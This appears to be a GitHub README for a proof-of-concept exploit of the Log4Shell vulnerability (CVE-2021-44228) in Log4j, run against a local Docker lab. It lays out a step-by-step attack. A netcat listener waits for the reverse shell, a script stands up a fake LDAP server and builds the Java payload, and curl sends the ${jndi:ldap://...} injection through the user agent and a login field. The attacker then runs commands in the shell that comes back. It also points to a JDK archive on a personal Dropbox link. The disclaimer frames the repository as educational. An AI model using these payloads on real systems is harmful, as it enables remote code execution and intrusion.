# log4j-shell-poc

Cribbed from the great https://github.com/kozmer/log4j-shell-poc !!  

![image](https://user-images.githubusercontent.com/4404271/157152474-b3696c41-473e-47b3-9cb8-2b949cecb382.png)

![log4j-shell-poc](https://user-images.githubusercontent.com/4404271/157141049-9ce9dc50-5d8e-4794-84ca-7148825401e4.gif)


A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>

#### Usage :

You need 4 terminals, or 3 terminals and a web browser!  
They are as follows:  

1) attacker terminal 1 of 3 (wow!): reverse shell cc reciever
2) attacker terminal 2 of 3: ldap listener enabler man in the middle jumper
3) attacker terminal 3 of 3: just a terminal to do a curl or use a web browser
4) victim terminal 1 of 1: run java app as docker container

Step 1) In terminal 1, Start  netcat to accept reverse shell connection:  
```py
nc -lvnp 9001
```

Step 2) In terminal 2, Launch the ldap listener jumper:  
**Note:** Must download jdk-8u202-linux-x64.tar.gz and extract to jdk1.8.0_202  

--> I have saved it to my personal dropbox here www dot dropbox dot com/   s/7c1d5y6naqcrdyh/jdk-8u202-linux-x64.tar.gz?dl=0  

Now run it like this:

```bash
pip install -r requirements.txt
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```
This script will setup the HTTP server (not sure what the http is for, but whatevs) and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.  

Step 3) In Terminal 3, Our vulnerable application  
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Step 4) In Terminal 4, Attack!  

```c
curl http://127.0.0.1:8080 -v  | grep session  
<snip>  
< HTTP/1.1 200 OK  
< Server: Apache-Coyote/1.1  
< Set-Cookie: JSESSIONID=2C4651F7F8F1FD3C73E544A7C5E3A600; Path=/; HttpOnly  
< Content-Type: text/html;charset=ISO-8859-1  
<snip>  
curl -v -A "\${jndi:ldap://localhost:1389/a}" -X POST -d uname="\${jndi:ldap://localhost:1389/a}" --cookie JSESSIONID=2C4651F7F8F1FD3C73E544A7C5E3A600 http://127.0.0.1:8080/login  
<snip>  
>  
* upload completely sent off: 37 out of 37 bytes  
```  

Step 5) Profit!!  

In terminal 1, type 'env' or 'whoami' and have a biscotti ... you earned it!  



Once it is running, you can access it on localhost:8080

Getting the Java version.
--------------------------------------
--> I have saved it to my personal dropbox here www dot dropbox dot com/   s/7c1d5y6naqcrdyh/jdk-8u202-linux-x64.tar.gz?dl=0  

Kozmer did it with java-8u20 but Oracle seems to have scrubbed this off their download page, but they still had java-8u202 and that seemed fine. I updated the python script to use that path in a few place, and voila. If you can't get it from my dropbox, Oracle thankfully provides an archive for all previous java versions:  
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).  
Scroll down to `8u20` and download the tar.gz for amd64, and tar -xvfz in your log4j-shell-poc folder.

**Note:** Oracle makes you  make an account to be able to download the package :-)  

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.  
